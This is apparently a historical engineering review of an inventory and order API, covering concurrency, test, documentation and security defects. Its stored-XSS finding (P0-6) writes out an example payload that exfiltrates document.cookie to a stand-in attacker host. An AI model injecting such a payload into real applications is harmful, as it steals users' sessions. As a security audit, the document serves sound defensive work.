# Ledgr — Engineering Review, Defect Register & Roadmap

**Reviewed:** 7 November 2026
**Commit:** `9261c27` (branch `develop`, working tree dirty)
**Scope:** whole repository — API, data layer, services, tests, front end, CI, docs.
**Reviewer stance:** independent code review; no source files were modified.

> **Status: historical.** This document describes commit `9261c27`, before the rewrite of
> 8 November 2026. Line references point at the old code. It is kept as a record of what was
> wrong, not as a description of the current repository.

## Resolution

| Area | Finding in this review | Current state |
| :--- | :--- | :--- |
| Concurrency | P0-1: read-check-write, no token | `Version` concurrency tokens on `Product` and `Order`, bumped in `SaveChanges`; database check constraint; multi-line rollback test |
| Repository | P0-2: HTTP layer uncommitted, `main` empty | **Still uncommitted** — the rewrite was left in the working tree for review, and nothing was pushed or committed |
| Database | P0-3: in-memory default, no migrations | SQLite, generated `InitialCreate`, `MigrateOnStartup` with an explicit design-time factory |
| Tests | P0-4: rollback test could not fail for that reason | 46 tests on real SQLite, including a genuine second-line rollback and a stale-context conflict |
| UI | P0-5 / P0-6: dead product button, stored XSS | Product modal implemented; all output escaped, no inline handlers, CSP, vendored Bootstrap |
| Orders | P1-7 / P1-8: no idempotency, no cancel | `Idempotency-Key` with a unique index; cancel endpoint with compensating movements |
| API | P1-9: unpaginated reads, `ToLower()` scans | Paged envelopes, `LIKE` with escaping, SQL counts, clamped page size |
| Errors | P1-5: 5xx leaked exception text | `IExceptionHandler` with problem details, generic 5xx body, `traceId`, warnings for 4xx |
| Ledger | P1-4: append-only not enforced | `SaveChanges` rejects modified or deleted movements; sign and enum rules in `InventoryMovement.Create` |
| Docs | §5: claims not implemented | README and `/docs` rewritten to describe what the code does |
| Security | P1-10: open CORS, no rate limit | CORS allow-list from configuration, 120 writes/min per IP, security headers. Authentication and tenancy remain deliberately out of scope and are documented as such |

---

## 0. How this review was produced (and its limits)

**What was done**

- Read every file in the repository (30 tracked/untracked source and doc files).
- Inspected git history, branches and working-tree state (`git log`, `git ls-tree`, `git status`).
- Cross-checked each architectural claim in `README.md` and `/docs` against the code that implements it.
- Verified a suspected front-end wiring gap by symbol search rather than by running the app.

**What was *not* done — and why**

| Check | Result |
| :--- | :--- |
| `dotnet build` | **Not run** — this machine has the .NET 8 *runtime* (`8.0.31`) but **no SDK** (`dotnet --list-sdks` is empty; `dotnet --version` → "No .NET SDKs were found"). |
| `dotnet test` | **Not run** — same reason. No baseline pass/fail exists for this review. |
| Runtime probing of the API | **Not run** — cannot start the app without the SDK. |

Consequently, **every finding below is static-analysis evidence** (source, git metadata, configuration). Findings that depend on runtime behaviour are labelled *(runtime-dependent)* and should be confirmed once an SDK is installed. Nothing here is reported as "verified by execution", because it was not executed.

Reproduce the environment gap:

```powershell
dotnet --list-sdks      # empty on this machine
dotnet --list-runtimes  # Microsoft.NETCore.App 8.0.31 only
```

---

## 1. Verdict

Ledgr is a **well-presented, competently structured, early-stage prototype** of an inventory/order API. The layering is sensible, the DTO boundary is clean, the ledger-with-snapshots idea is genuinely good, and the documentation is far above the average portfolio project.

It is **not** what the README says it is. The headline claim — that the system *eliminates overselling under concurrency* — is not implemented: there is no concurrency token, no conditional update, and no lock, so the exact lost-update race described in `docs/ARCHITECTURE.md` §2.1 is still present. In addition, the entire HTTP layer is **uncommitted**, and `main` contains no application code at all.

| Area | Grade | One-line assessment |
| :--- | :---: | :--- |
| Structure & separation of concerns | B | Clear folders, DTOs at the edge, thin controllers (where committed). Not the "Clean Architecture" the docs describe, but appropriate for the size. |
| Data integrity | D | Good schema shape; two non-atomic writes, no DB check constraint, "append-only" ledger not enforced. |
| Concurrency correctness | **F** | Read-check-write with no isolation control. The core selling point. |
| Test quality | D | 5 meaningful tests, but the flagship "rollback" test cannot fail for the reason it claims, and the provider ignores transactions. |
| CI | D | Targets an empty `main`; no coverage gate despite documentation promising one. |
| Docs vs. reality | D | Excellent writing, materially inaccurate claims. This is the project's biggest credibility risk. |
| Security | D | No authentication, permissive CORS, stored XSS in the UI, 5xx leaks exception text. |
| Operability | F | No migrations, no health checks, no container, no structured logging, silent in-memory fallback. |

**Bottom line:** fix the four P0 items before showing this as "transactional"; fix the documentation claims in the same pass. The gap between README and code is currently larger than any single bug.

---

## 2. P0 — Blockers

### P0-1 · Concurrent orders can still oversell (the central claim is false)

**Evidence:** `Ledgr.Api/Services/OrderService.cs:31-35`, `:61`, `:70`

```csharp
var products = await _context.Products                       // :31  read
    .Where(p => requestedProductIds.Contains(p.Id))
    .ToDictionaryAsync(p => p.Id);

if (product.QuantityOnHand < itemDto.Quantity) { ... }        // :61  check
product.QuantityOnHand = previousStock - itemDto.Quantity;    // :70  write
```

**Why the transaction does not save you.** A transaction gives *atomicity*, not *mutual exclusion*. Under SQL Server's default `READ COMMITTED`, two concurrent requests both read `QuantityOnHand = 5`, both pass the check at `:61`, and both issue:

```sql
UPDATE Products SET QuantityOnHand = 4 WHERE Id = 1;   -- absolute value, not "stock - 1"
```

The second commit overwrites the first. Two orders are confirmed for one physical unit, and the ledger records `20 → 16` twice — so `docs/DATABASE_DESIGN.md` §2's "Current Stock Equation" invariant (`QuantityOnHand = Σ QuantityChange`) also breaks.

This is precisely the failure mode illustrated in `docs/ARCHITECTURE.md` §2.1, which the document then claims to have solved.

**Fix — pick one, in order of preference:**

1. **Optimistic concurrency (recommended, smallest diff):**

```csharp
// Product.cs
public byte[] RowVersion { get; set; } = Array.Empty<byte>();

// ApplicationDbContext.OnModelCreating
entity.Property(p => p.RowVersion).IsRowVersion();
```

EF then emits `WHERE Id = 1 AND RowVersion = @original`; the loser gets `DbUpdateConcurrencyException`. Retry the whole unit of work a bounded number of times, then return `409`.

2. **Conditional atomic decrement** (no extra column, but bypasses the change tracker):

```csharp
var affected = await _context.Products
    .Where(p => p.Id == id && p.QuantityOnHand >= qty)
    .ExecuteUpdateAsync(s => s
        .SetProperty(p => p.QuantityOnHand, p => p.QuantityOnHand - qty)
        .SetProperty(p => p.UpdatedAtUtc, DateTime.UtcNow));

if (affected == 0) throw new InsufficientStockException(sku, qty, /* current */ 0);
```

Caveat: read the row back inside the same transaction to fill `PreviousQuantity` / `NewQuantity` honestly.

3. **`SERIALIZABLE` + `UPDLOCK, ROWLOCK`** — correct but heavier and deadlock-prone; only if you cannot change the schema.

**Always add the database-level backstop**, so no future code path can drive stock negative:

```csharp
entity.ToTable(t => t.HasCheckConstraint(
    "CK_Product_QuantityOnHand_NonNegative", "[QuantityOnHand] >= 0"));
```

---

### P0-2 · `main` has no application code; the whole HTTP layer is uncommitted

**Evidence**

```
$ git ls-tree -r --name-only origin/main
.gitignore  CONTRIBUTING.md  Ledgr.Api/Ledgr.Api.csproj
Ledgr.Api/appsettings*.json  Ledgr.Tests/Ledgr.Tests.csproj
Ledgr.sln  README.md  docs/*.md            # ← that is the entire branch

$ git status --porcelain
?? Ledgr.Api/Controllers/
?? Ledgr.Api/Middleware/
?? Ledgr.Api/Program.cs
?? Ledgr.Api/Properties/
?? Ledgr.Api/wwwroot/
?? Ledgr.Api/Ledgr.Api.http
```

`develop` holds models, data, services and tests — but **no `Program.cs`, no controllers, no middleware, no UI**. Every file that makes the service an actual HTTP API exists only in this working tree.

**Impact**

- `git clone` + the README quick start produces a project with no entry point.
- CI only triggers on `main` and PRs to `main` (`.github/workflows/build-test.yml:3-7`), so **whatever the badge shows, it cannot reflect the application**: `main` contains no endpoints, and `Ledgr.Tests` on `main` has no `*.cs` files at all.
- `CONTRIBUTING.md` §1 states `main` is "production-ready, always building and passing tests". It is neither.
- Any disk loss or `git clean` destroys the only copy of the API layer.

**Fix**

1. Commit the HTTP layer on `feat/api-surface`, merge to `develop`.
2. Promote `develop` → `main` only when it builds and tests pass.
3. Point CI at `develop` as well (push + PR), and enable branch protection on `main`.

---

### P0-3 · The "ACID on SQL Server" path has never run; the default is ephemeral in-memory

**Evidence:** `Ledgr.Api/appsettings.json:10` (`"DefaultConnection": ""`), `Ledgr.Api/Program.cs:25-33`, `Ledgr.Api/Data/DbInitializer.cs:11-12`, no `Migrations/` folder anywhere.

```csharp
if (!string.IsNullOrEmpty(connectionString))
    options.UseSqlServer(connectionString);      // never taken: connection string is ""
else
    options.UseInMemoryDatabase("LedgrDb");      // always taken

await context.Database.EnsureCreatedAsync();     // no migration story
```

**Impact**

- Data disappears on every restart — the demo looks broken after a reboot, and "SaaS" is not credible.
- The in-memory provider **does not support transactions**; that is why both test files suppress `InMemoryEventId.TransactionIgnoredWarning`. So no test, and no manual run, has ever exercised `BeginTransactionAsync` committing or rolling back.
- `EnsureCreated` is mutually exclusive with migrations: the first time you add a migration, existing databases cannot be upgraded.
- InMemory also differs on case sensitivity, relational constraints, and query translation — several bugs below would surface only on SQL Server.

**Fix**

```bash
dotnet ef migrations add InitialCreate -p Ledgr.Api
```

- Replace `EnsureCreatedAsync()` with `MigrateAsync()` (or run migrations out-of-band in deploy).
- Provide `docker-compose.yml` with SQL Server so `docker compose up` reproduces production semantics.
- Fail fast in non-Development when no connection string is configured, instead of silently degrading to in-memory:

```csharp
if (!builder.Environment.IsDevelopment() && string.IsNullOrEmpty(connectionString))
    throw new InvalidOperationException("DefaultConnection is required outside Development.");
```

---

### P0-4 · The "rolls back atomically" test does not test rollback

**Evidence:** `Ledgr.Tests/OrderServiceTests.cs:75-118`

The test orders one line item that exceeds stock and asserts `QuantityOnHand` is unchanged. But the exception is thrown at `OrderService.cs:61`, **before any mutation** — so the assertion proves "validation happens before writing", not "a partial write is rolled back". A rollback bug would pass this test unchanged.

Additionally, the provider ignores transactions (the warning is explicitly suppressed in `CreateInMemoryDbContext`), so even a correctly designed rollback test would prove nothing on InMemory.

The same pattern appears in `InventoryServiceTests.cs:67-100`.

**Fix — two tests, both meaningful:**

```csharp
[Fact] // line 1 succeeds, line 2 fails → line 1 must not stick
public async Task CreateOrder_WhenSecondLineFails_LeavesFirstLineStockUnchanged()
{
    // product A: 10 in stock, product B: 0 in stock
    // order: A×2, B×1  →  throws InsufficientStockException
    // assert A.QuantityOnHand == 10 and no movement for A and no order
}

[Fact] // the actual oversell test
public async Task ConcurrentOrders_ForFiveUnits_NeverSellMoreThanFive()
{
    // 20 parallel CreateOrderAsync calls, 1 unit each, stock = 5
    // assert: exactly 5 success, 15 InsufficientStockException,
    //         stock == 0, SUM(QuantityChange) == 0
}
```

Run both against **SQL Server (Testcontainers)** or, at minimum, SQLite in-memory. Note that SQLite serialises writers, so it can *hide* a missing concurrency token — the SQL Server container is the honest option for the second test.

---

### P0-5 · The "Add Product" button calls a function that does not exist

**Evidence:** `Ledgr.Api/wwwroot/index.html:166`

```html
<button class="btn btn-dark btn-sm" onclick="showNewProductModal()">
```

`app.js` is 302 lines and defines `showNewOrderModal` (`:218`) but **no `showNewProductModal`** — verified by symbol search across `wwwroot`. Clicking the button throws `ReferenceError: showNewProductModal is not defined`; nothing visible happens.

There is also no create/edit/deactivate product UI at all, so product lifecycle (PRD FR-1) is reachable only through Swagger.

**Fix:** implement the modal + `POST /api/Products` / `PUT` / `DELETE` flows, or remove the button until they exist. Shipping a dead primary action is worse than omitting it.

---

### P0-6 · Stored XSS on every list render, with no authentication in front of it

**Evidence:** `app.js:61-92` (products), `:143-184` (ledger), `:186-216` (orders)

```javascript
tbody.innerHTML = products.map(p => `
    <td><div class="fw-semibold">${p.name}</div>
        <small>${p.description || 'No description'}</small></td>
    ...
    <button onclick="openAdjustModal(${p.id}, '${p.sku}', '${escapeQuotes(p.name)}')">
`).join('');
```

`name`, `description`, `category`, `reason`, `referenceId`, `customerName` and `customerEmail` are all attacker-controlled through the public API and are interpolated into HTML without encoding. A single `POST /api/Products` with `name: "<img src=x onerror=fetch('//attacker/'+document.cookie)>"` executes in every operator's browser.

`escapeQuotes()` (`:299`) only replaces `'` for an inline `onclick` string; it does not encode HTML, does not protect the `p.sku` argument at `:85`, and inline handlers make the escaping problem structurally worse.

**Fix**

- Build rows with DOM APIs (`textContent`) or apply an `escapeHtml()` to every interpolation.
- Replace inline `onclick` with `addEventListener` + `data-id` attributes (removes the JS-string escaping problem entirely).
- Add a CSP header (`default-src 'self'`; drop or SRI-pin the CDN assets).
- Put authentication in front of the API — this UI must not be reachable by untrusted clients.

---

## 3. P1 — High severity

| ID | Location | Defect | Impact | Fix |
| :--- | :--- | :--- | :--- | :--- |
| P1-1 | `ProductService.cs:73`, `:89` | Product and its opening ledger entry are persisted in **two separate `SaveChangesAsync` calls**, no transaction. | If the second write fails, a product exists whose stock has no ledger history — invariant #2 in `DATABASE_DESIGN.md` is violated permanently. | One `SaveChangesAsync` (EF fixes up the FK in a single implicit transaction), or wrap both in an explicit transaction. |
| P1-2 | `OrderService.cs:88-95`, `:148-149` | `OrderItem.Product` is never assigned; `MapToDto` therefore falls back to `"Product"` / `"N/A"`. | `POST /api/Orders` returns a 201 body with **wrong product names and SKUs**, while `GET /api/Orders/{id}` returns correct ones. Any client that trusts the create response stores corrupt data. | Set `Product = product` on the `OrderItem`, or project the DTO from the in-memory `products` dictionary. |
| P1-3 | `OrderService.cs:36` | Order number suffix is `Guid[..6]` = **24 bits**. | With a unique index on `OrderNumber`, a collision becomes `DbUpdateException` → **500**. Birthday math: ~1 000 orders/day ≈ 3 % chance of a collision per day; ~5 000/day ≈ 52 %; ~10 000/day ≈ 95 %. | Use a DB sequence (`ORD-20261107-000123`), a 26-char ULID, or at least 12 hex chars + retry on unique violation. |
| P1-4 | `Models/InventoryMovement.cs`, `Data/ApplicationDbContext.cs` | The ledger is described as immutable/append-only, but **nothing enforces it**: EF can update or delete movement rows, and `MovementType`/sign are unvalidated (`WriteOff` with `+5` is accepted; JSON `"type": 99` is accepted because `System.Text.Json` does not validate enum ranges). | The audit trail can silently diverge from reality; the "double-entry" guarantee is unenforceable. | Override `SaveChangesAsync` and reject `Modified`/`Deleted` for `InventoryMovement`; validate `Enum.IsDefined(dto.Type)` and the sign/type pairing; optionally hash-chain rows. |
| P1-5 | `ExceptionHandlingMiddleware.cs:33`, `:53` | 5xx responses return `Detail = ex.Message` (stack-adjacent internals, SQL text, file paths); no `context.Response.HasStarted` check; business 404/409 logged at `Error`. | Information disclosure to clients; log noise that hides real failures; an exception thrown after the response starts causes a second, masking exception. | Use .NET 8 `IExceptionHandler`; return a generic message + `traceId` for 5xx, `LogWarning` for 4xx, and guard on `HasStarted`. |
| P1-6 | `OrderService.cs:24`, `InventoryService.cs:24` | `CreateExecutionStrategy()` is called, but `EnableRetryOnFailure` is never configured → the strategy is **non-retrying**. `ARCHITECTURE.md` §2.2 claims it "handles transient connection retries cleanly". If retries were enabled, the delegate would replay against a `DbContext` still tracking mutated entities → **double deduction**. | False sense of resilience; a latent double-write bug waiting for the first person who enables retries. | Either remove the wrapper and document the choice, or enable retries properly and make the unit of work replay-safe (fresh context per attempt, or an idempotent conditional update). |
| P1-7 | `OrdersController.cs:18-26` | No idempotency mechanism on order creation. A client timeout + retry creates two orders and deducts stock twice. | Duplicate fulfilment, wrong stock, angry customers. `DATABASE_DESIGN.md` claims the order number "guarantees idempotency" — it does not; it is generated server-side per request. | Accept an `Idempotency-Key` header, store key → order id with a unique index, return the original order on replay. |
| P1-8 | `Models/Enums/OrderStatus.cs`, `OrdersController.cs` | `Cancelled` exists but **no endpoint ever sets it**; there is no cancel, return, or restock path. | Stock can only ever go down. A cancelled order permanently leaks inventory; the enum advertises a capability that does not exist. | `POST /api/Orders/{id}/cancel` → compensating `StockIn` movement (never mutate history), status transition guard. |
| P1-9 | `ProductService.cs:26`, `InventoryService.cs:95`, `DashboardService.cs:20-26` | `p.Name.ToLower().Contains(s)` is non-sargable (full scan, collation-dependent); no pagination anywhere; dashboard loads **all** active products into memory to sum them; `limit` is unvalidated (`Take(-1)`, `Take(int.MaxValue)`). | The NFR "reads < 50 ms" cannot hold beyond a few thousand rows; a large catalog can exhaust memory or throw. | `EF.Functions.Like` or a case-insensitive collation; keyset pagination; `SumAsync`/`CountAsync` in SQL; clamp `limit` to 1..200. |
| P1-10 | `Program.cs:42-48`, `:69` | `AllowAnyOrigin/AnyMethod/AnyHeader` + **no authentication/authorization** + no tenant scoping, while the product is positioned as multi-tenant SaaS. | Any network client can read and destroy all inventory data; no audit of *who* changed stock; no isolation between customers. | JWT/API-key auth with a default-deny fallback policy; `TenantId` + global query filter; CORS allow-list from config; rate limiting on writes. |
| P1-11 | `Data/DbInitializer.cs:12-16` | Seeding runs on **every** startup in every environment, using `EnsureCreated` and a check-then-act `AnyAsync()` guard. | Two instances starting together can both seed → duplicate catalog and duplicate opening ledger entries. In production it mutates real data on boot. | Move seeding to migrations + an idempotent, natural-key-based seeder; never seed in production implicitly. |

---

## 4. P2 — Medium and low findings

| # | Location | Finding |
| :--- | :--- | :--- |
| 1 | `ProductsController.cs:57-63` | `DELETE` returns `204` even when the product was already inactive — no state check, no distinction between "deactivated now" and "already inactive". |
| 2 | `DTOs/LedgrDtos.cs:39-45` | `[Required]` on non-nullable `int` (`ProductId`, `QuantityChange`) is a no-op. `ProductId = 0` or `-5` passes validation and reaches the service. Add `[Range(1, int.MaxValue)]`. |
| 3 | `DTOs/LedgrDtos.cs:30-37` | `UpdateProductDto` is a full-replacement `PUT` (Name, Category, Price, ReorderLevel, IsActive all required). No `PATCH`, so "deactivate" requires the client to resend the whole product. |
| 4 | `ProductService.cs:56` | Duplicate-SKU check is check-then-act; the unique index is the real guard, but its violation surfaces as `DbUpdateException` → **500** instead of the intended `409 DuplicateSkuException`. |
| 5 | `Models/OrderItem.cs:23` | `SubTotal` is a computed, unmapped property — revenue cannot be aggregated in SQL, and any future report has to materialise rows in memory. |
| 6 | `index.html:113`, `DashboardService.cs:25` | KPI labelled "Fulfilled Orders" is `TotalOrders` — it counts every order, including cancelled ones. Label or query is wrong. |
| 7 | `app.js:24`, `:207`, `:165`, `:209` | Currency hardcoded to `$` and `en-US`; timestamps rendered with `toLocaleString()` while the column header says UTC. No culture or multi-currency support despite "SaaS". |
| 8 | everywhere | No `CancellationToken` parameter on any async method, directly contradicting `CONTRIBUTING.md` §4. Aborted requests still commit. |
| 9 | `appsettings.json:10` + `Program.cs:25` | Connection string is empty and there is no user-secrets / env-var guidance — the documented "SQL Server" path is not runnable as shipped. |
| 10 | `Ledgr.Api.http:3` | Still calls `/weatherforecast` (template leftover) → 404. |
| 11 | `README.md:74-75` | Claims the UI runs at `localhost:5000` / `https://localhost:7001`; `launchSettings.json` uses `5196` / `7299`. Quick start does not match reality. |
| 12 | repo root | README shows an MIT badge but there is **no `LICENSE` file**. Legally the project is "all rights reserved". |
| 13 | `Ledgr.Tests.csproj:13,16` | `Moq` and `coverlet.collector` are referenced but never used, and CI never collects coverage. Dead dependencies that imply coverage exists. |
| 14 | `index.html:8-10, 348` | Bootstrap/icons/fonts loaded from CDNs without SRI hashes; the demo is unusable offline and adds a supply-chain surface. |
| 15 | repo root | No `global.json` (SDK drift between dev and CI's `8.0.x`), no `.editorconfig`, no `Directory.Build.props`, no analyzers, no `TreatWarningsAsErrors` — `CONTRIBUTING.md` §4 style rules are unenforced. |
| 16 | `Program.cs` | No `UseHttpsRedirection`, no HSTS, no health-check endpoints, no Serilog/OpenTelemetry (all claimed in `PRD.md` §6), no rate limiter, no API versioning. |
| 17 | `index.html:273-295` | Modal `<label>` elements have no `for` attribute → screen readers do not associate them with inputs; no focus management. |
| 18 | `app.js` | Errors surfaced via `alert()`; buttons are not disabled during submit, so a double-click sends two orders (compounds P1-7). |

---

## 5. Documentation vs. implementation

The docs are the project's strongest asset *and* its largest liability: they are written as if the system were finished. Every claim below is contradicted by the code.

| Claim | Where | Reality |
| :--- | :--- | :--- |
| "Immutable **double-entry** stock ledger" | README, PRD, UI tab title | Single-entry journal: one row per delta with before/after snapshots. No counter-account, no debit/credit pairing. The audit trail is good; the accounting term is wrong. |
| "**Eliminates** overselling when concurrent checkouts hit low stock" | README differentiators table | No concurrency token, no conditional update, no lock. The race is fully intact (P0-1). |
| "Order fulfillment wrapped in explicit database transactions" | README | True in code, but the default runtime is the in-memory provider, which ignores transactions (P0-3). |
| "Guaranteed **zero regression**" | README | 5 tests; no test covers controllers, middleware, dashboard, product service, or concurrency. |
| "PRs blocked if coverage drops below **85 %**" | `TESTING_STRATEGY.md:70` | `.github/workflows/build-test.yml` has no coverage step at all. |
| Test matrix lists **6** cases incl. `CreateProduct_DuplicateSku` | `TESTING_STRATEGY.md` §3 | 5 `[Fact]`s exist; no `ProductServiceTests` file at all. |
| "Structured logging via **Serilog**" | `PRD.md:73` | No Serilog package reference; default `ILogger` only. |
| Composite indexes `(Category, IsActive)`, `(ProductId, CreatedAtUtc)` | `DATABASE_DESIGN.md` §3 | Only `CreatedAtUtc` and the implicit FK index exist; no composite index, no `Category` index. |
| Non-negativity "constraint" | `DATABASE_DESIGN.md` §2.3 | Application-level check only; no DB check constraint. |
| Order number "guarantees **idempotency**" | `DATABASE_DESIGN.md` | Server-generated random suffix; provides uniqueness at best, and not reliably (P1-3). |
| "Clean Architecture" | README, `ARCHITECTURE.md` | One project with folders; services depend directly on `DbContext`. Fine for this size — but the label is aspirational. |
| "`main`: production-ready, always building and passing tests" | `CONTRIBUTING.md` §1 | `main` has no `Program.cs`, no controllers, no tests (P0-2). |
| UI at `localhost:5000` / `7001` | README | Actual ports are `5196` / `7299`. |
| MIT licence | README badge | No `LICENSE` file. |

**Recommendation:** rewrite the README's differentiator table to separate *implemented* from *planned*, and add a short "Status / Known limitations" section. A reviewer who finds an unimplemented headline claim stops trusting the rest of the document — which is a shame, because most of the rest is genuinely good.

---

## 6. Recommended engineering practices

### 6.1 Put the invariant in one place

Today the stock arithmetic (`previous → new`, non-negativity, ledger append) is duplicated in `OrderService` and `InventoryService`, and `ProductService` writes `QuantityOnHand` directly. That is how invariants drift.

```csharp
// Product.cs — the only way quantity may change
public InventoryMovement ApplyMovement(int delta, MovementType type, string reason, string? referenceId)
{
    var previous = QuantityOnHand;
    var next = previous + delta;
    if (next < 0) throw new InvalidOperationException($"Negative stock for {Sku}");
    QuantityOnHand = next;
    UpdatedAtUtc = DateTime.UtcNow;
    return new InventoryMovement { /* … */ PreviousQuantity = previous, NewQuantity = next };
}
```

Then both services become "load → apply → save", and a unit test can assert the invariant without a database.

### 6.2 Enforce append-only at the persistence boundary

```csharp
public override Task<int> SaveChangesAsync(CancellationToken ct = default)
{
    foreach (var entry in ChangeTracker.Entries<InventoryMovement>())
        if (entry.State is EntityState.Modified or EntityState.Deleted)
            throw new InvalidOperationException("Inventory movements are append-only.");

    return base.SaveChangesAsync(ct);
}
```

Add a reconciliation check (test + scheduled job): `Product.QuantityOnHand == SUM(InventoryMovement.QuantityChange)` per product, and `NewQuantity == PreviousQuantity + QuantityChange` on every row.

### 6.3 Tests that are able to fail

- **Providers:** SQL Server via Testcontainers for anything touching transactions or concurrency; SQLite for fast service tests; InMemory only for pure mapping.
- **Concurrency:** `Task.WhenAll` of N checkouts against stock M; assert successes == M and final stock == 0.
- **Integration:** `WebApplicationFactory<Program>` for status codes and `application/problem+json` shape — controllers and middleware are currently 0 % covered. (This needs `public partial class Program { }` at the end of `Program.cs`.)
- **Contract:** snapshot the OpenAPI document; assert it does not change unintentionally.
- **Property-based:** FsCheck over ledger arithmetic (`New == Prev + Delta`, sum invariant).
- **Naming:** do not write `AndRollsBack` unless the test can distinguish rollback from "never wrote".

### 6.4 Build & repository hygiene

```
global.json                 # pin SDK 8.0.4xx, rollForward: latestFeature
Directory.Build.props       # TreatWarningsAsErrors, AnalysisLevel=latest-recommended,
                            # EnforceCodeStyleInBuild, Deterministic
.editorconfig               # the style CONTRIBUTING.md describes
```

CI additions (all one line each):

```yaml
- run: dotnet format Ledgr.sln --verify-no-changes --no-restore
- run: dotnet test -c Release --collect:"XPlat Code Coverage" --results-directory ./coverage
- run: dotnet list Ledgr.sln package --vulnerable --include-transitive
```

Plus: run on `push` to `develop`, cache NuGet, enable Dependabot and CodeQL, add a PR template, protect `main`, squash-merge, and keep a `CHANGELOG.md`.

### 6.5 API design

- Version the surface (`/api/v1/...`) before anyone integrates.
- Pagination envelope: `{ items, page, pageSize, total }`; clamp `pageSize`; keyset for the ledger.
- `PATCH /api/Products/{id}` for partial updates.
- One error contract everywhere: `type`, `title`, `status`, `detail`, `traceId`, `errors[]`.
- `Idempotency-Key` on `POST /orders`; `ETag` + `If-None-Match` on catalog reads.
- Status semantics: insufficient stock → `409` (correct today); unknown product *inside a valid order body* → `422`, not `404` (the URL resource exists).
- Rate-limit write endpoints (`AddRateLimiter`, fixed window per API key).

### 6.6 Security

- Authentication before anything else: JWT bearer or per-tenant API keys, `[Authorize]` by default via `FallbackPolicy`.
- `TenantId` on every aggregate + global query filter + `SaveChanges` stamping.
- CORS allow-list from configuration (never `AllowAnyOrigin` with a browser UI).
- `UseHttpsRedirection()` + HSTS in non-Development.
- Encode on output; CSP; SRI or vendored assets.
- Secrets via `dotnet user-secrets` / environment variables; validate config with `ValidateOnStart()`.

### 6.7 Operability

- `AddHealthChecks()` with `/health/live` and `/health/ready` (including a DB probe).
- Serilog (or OpenTelemetry) with correlation IDs; log 4xx at Warning, 5xx at Error, include `traceId` in the problem response.
- `Dockerfile` + `docker-compose.yml` (api + SQL Server) so local runs match production.
- Metrics worth alerting on: orders/min, 409 rate, ledger reconciliation drift, p95 write latency.

### 6.8 Front end (if it stays)

Replace string-built HTML with DOM construction or a tiny template helper; `alert()` → toast; disable submit buttons while in flight; add the missing product CRUD UI; show times in a single, labelled timezone; fix `label for=` associations.

---

## 7. Feature roadmap

Ordered by dependency, not by excitement.

| Priority | Feature | Why it matters now | Effort |
| :--- | :--- | :--- | :--- |
| **Now** | Order cancel / return with compensating `StockIn` | Without it, every cancellation permanently leaks inventory, and `OrderStatus.Cancelled` is dead code. | S |
| **Now** | Product create/edit/deactivate UI | The primary button in the catalog is broken; the API exists but is unreachable. | S |
| **Now** | Pagination + filtering + sorting | Prerequisite for any real catalog size; the dashboard already loads everything. | S |
| **Now** | Idempotency key on order creation | Prevents double deductions from client retries — cheap now, expensive later. | S |
| **Next** | Purchase orders / receiving (supplier + PO document) | `StockIn` currently has a free-text reason; real receiving needs a document to reconcile against invoices. | M |
| **Next** | Reservations with TTL (reserve → confirm → fulfil) | Current model deducts at order creation; abandoned carts permanently consume stock. | M |
| **Next** | Stocktake / cycle count workflow with variance report | The most common warehouse operation, and a natural showcase for the ledger. | M |
| **Next** | CSV import/export + barcode lookup endpoint | Table stakes for onboarding a real catalog and warehouse scanning. | S–M |
| **Next** | Low-stock notifications (email/webhook) | The PRD calls this an "engine"; today it is a dashboard number. | S |
| **Then** | AuthN/AuthZ + tenant isolation + roles (admin / warehouse / viewer) | Blocking for any multi-user or SaaS claim; also fixes "who changed stock". | M–L |
| **Then** | Multi-location inventory + transfers | Phase 2 in the PRD; requires location on movements and a transfer primitive (paired entries — the only place true double-entry is genuinely useful). | L |
| **Then** | Returns/RMA with restock vs. scrap decision | Real-world counterpart to write-offs. | M |
| **Later** | Valuation (FIFO / weighted average), COGS, margin reporting | Turns the ledger into a finance-grade source of truth. | L |
| **Later** | Outbox + webhooks, event-driven read model | Needed once other systems subscribe to stock changes. | L |
| **Later** | Bulk order import, backorders, allocation priority | Scale features; premature before auth and reservations. | L |

---

## 8. Pending work — ordered checklist

### Tier 0 — do this week (the project is not what it claims until these are done)

- [ ] Commit `Controllers/`, `Middleware/`, `Program.cs`, `Properties/`, `wwwroot/`, `.http` (**P0-2**)
- [ ] Merge `develop` → `main`; make CI run on `develop` pushes and PRs
- [ ] Fix concurrency with `RowVersion` (+ retry → 409) and add the DB check constraint (**P0-1**)
- [ ] Add `Migrations/`, switch `EnsureCreated` → `Migrate`, add `docker-compose` with SQL Server (**P0-3**)
- [ ] Replace the fake rollback test with a multi-line test + a parallel oversell test on SQL Server (**P0-4**)
- [ ] Fix `POST /api/Orders` line-item mapping (**P1-2**)
- [ ] Escape HTML / rebuild rows with DOM APIs; remove inline `onclick` (**P0-6**)
- [ ] Either implement `showNewProductModal` or delete the button (**P0-5**)

### Tier 1 — next sprint

- [ ] Single-transaction product + opening ledger write (**P1-1**)
- [ ] Deterministic order numbers via sequence/ULID (**P1-3**)
- [ ] Enforce append-only ledger + validate `MovementType`/sign (**P1-4**)
- [ ] Rewrite exception handling (`IExceptionHandler`, no 5xx detail leakage, `traceId`) (**P1-5**)
- [ ] Cancel/return endpoint with compensating movement (**P1-8**)
- [ ] Pagination + SQL aggregates + sargable search (**P1-9**)
- [ ] Coverage gate + `dotnet format --verify-no-changes` + vulnerable-package scan in CI
- [ ] Add `LICENSE` (MIT), `global.json`, `Directory.Build.props`, `.editorconfig`
- [ ] Correct README ports, `.http` sample, and the "6 tests" matrix

### Tier 2 — before calling it production-ready

- [ ] Authentication, tenant scoping, restrictive CORS, rate limiting (**P1-10**)
- [ ] Idempotency keys (**P1-7**)
- [ ] Retry strategy done properly or removed (**P1-6**)
- [ ] Health checks, Serilog/OpenTelemetry, HTTPS redirection + HSTS
- [ ] Integration tests for every endpoint and error shape
- [ ] Idempotent seeding / no implicit seeding in production (**P1-11**)
- [ ] Delete the "double-entry" claim or implement paired entries

---

## 9. What is genuinely good (keep it)

- **DTOs at the boundary.** No EF entity ever leaves the API surface; records with data annotations are the right call.
- **The ledger's before/after snapshots.** `PreviousQuantity` / `NewQuantity` alongside the delta is a genuinely useful audit design — most small inventory apps just store a delta.
- **Centralised error handling.** The instinct is right even if the implementation needs work; `ProblemDetails` is the correct contract.
- **Soft delete to protect history.** `IsActive` instead of row deletion is the right trade-off for an order/ledger system.
- **Named domain exceptions carrying status codes.** Easy to map, easy to test, readable at the call site.
- **Money as `decimal` with `Precision(18,2)`**, UTC timestamps, unique indexes on `Sku` and `OrderNumber`.
